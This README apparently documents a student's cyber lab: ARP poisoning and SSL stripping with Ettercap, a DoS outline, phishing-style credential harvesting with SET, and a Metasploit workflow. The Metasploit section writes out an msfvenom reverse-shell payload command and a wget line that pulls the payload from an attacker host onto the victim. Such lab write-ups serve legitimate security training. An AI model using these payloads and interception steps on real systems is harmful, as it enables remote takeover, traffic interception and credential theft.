# CYBER-LAB

🛡️ Analysis of LAN-Based Attacks Captured in Splunk
This repository contains analysis and documentation of various LAN-based attacks captured and investigated using Splunk. The following attacks were tested in a controlled lab environment using tools like Ettercap and sslstrip, and data was collected and analyzed to understand the impact on local network communication.

🔍 ARP Poisoning (Spoofing)
ARP Poisoning is a technique where an attacker sends falsified ARP messages over a local network to associate their MAC address with the IP address of another host (e.g., the default gateway). This allows them to intercept or modify network traffic.

📘 How ARP Works:
ARP maps IP addresses to MAC addresses.

Devices broadcast ARP requests like "Who has IP 10.0.2.1?".

The legitimate device responds with its MAC address.

Devices update their ARP cache based on the response.

⚠️ ARP Spoofing Process:
Attacker IP: 10.0.2.5

Victim IP: 10.0.2.4

The attacker sends spoofed ARP replies, mapping the victim’s IP to their own MAC.

Victim's ARP cache is updated with the malicious mapping.

The attacker can now intercept packets intended for the victim or the gateway.

🛠️ Ettercap Configuration:
Target 1: 10.0.2.4 (Victim)

Target 2: 10.0.2.1 (Gateway)

Enabled "Sniff remote connections"

Activated ARP Poisoning

🔓 SSL Stripping
SSL Stripping downgrades a secure HTTPS connection to HTTP, allowing an attacker to read and manipulate plaintext data during a man-in-the-middle (MITM) attack.

🔁 How SSL Stripping Works:
Intercepts Traffic: Via ARP spoofing or DNS spoofing.

Downgrades HTTPS:

Client initiates HTTP request.

Server replies with HTTPS redirect.

Attacker intercepts and removes the redirect.

Proxies Connection:

HTTPS with the server.

HTTP with the client.

🛠️ Setup:
Target 1: 10.0.2.4 (Victim)

Target 2: 10.0.2.1 (Gateway)

Used sslstrip to intercept and downgrade HTTPS traffic.

🚫 DoS Attack (Denial-of-Service)
A DoS attack aims to make a system or network unavailable by overwhelming it with traffic or exploitative requests.

⚙️ Attack Stages:
Target Selection:

Target: Vulnerable Ubuntu machine.

Preparation:

Choose unused or spoofed source IP.

Identify protocol-specific flaws (e.g., TCP SYN flood).

Execution:

Flood the victim with traffic or repeated connection requests.

Cause slowdowns or total unavailability.

🛠️ Attack Execution:
Input victim IP (e.g., 10.0.2.4)

Use an unused or spoofed IP

Activate DoS attack using appropriate tool or script

📊 Splunk Analysis (to be added)
Captured traffic and logs from these attacks can be visualized and analyzed using Splunk, providing insight into:

Suspicious ARP table updates

Unencrypted HTTP traffic during SSL stripping

Traffic spikes during DoS

📂 Splunk dashboards, searches, and screenshots will be added in the /splunk-analysis/ folder.
---------------------------------------------------------------------------

🎭 Social Engineering Toolkit (SET) – Credential Harvesting
Simulated a phishing attack using SET in a lab environment.

Attacker IP: 10.0.2.14

Victim IP: 10.0.2.4

Selected:

Website Attack Vectors → Credential Harvester → Site Cloner

Cloned a legitimate website and hosted it on attacker's machine.

Victim accessed http://10.0.2.14, entered credentials.

Captured credentials were displayed on the attacker's terminal.

---------------------------------------------------------------------------

🔐 Metasploit Penetration Testing Workflow (Kali → Ubuntu)
Reconnaissance

Used auxiliary/scanner/portscan/tcp and udp_sweep to find open ports.

Payload Creation

Created reverse shell:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.14 LPORT=4444 -f elf > shell.elf

Payload Delivery

Hosted with Python HTTP server, downloaded on victim:
wget http://10.0.2.14:8000/shell.elf

Listener Setup

Used exploit/multi/handler in Metasploit to catch reverse shell.

Execution & Access

Ran payload on victim → Got Meterpreter session:
Commands: sysinfo, shell, download, upload, execute

Post-Exploitation

Explored payloads like bind_tcp, reverse_http, and shell/reverse_tcp for persistence and stealth.

---------------------------------------------------------------------------

⚠️ Disclaimer
All activities were performed in a controlled, ethical lab environment for educational and research purposes only. Do not attempt these attacks on networks you do not own or have permission to test.

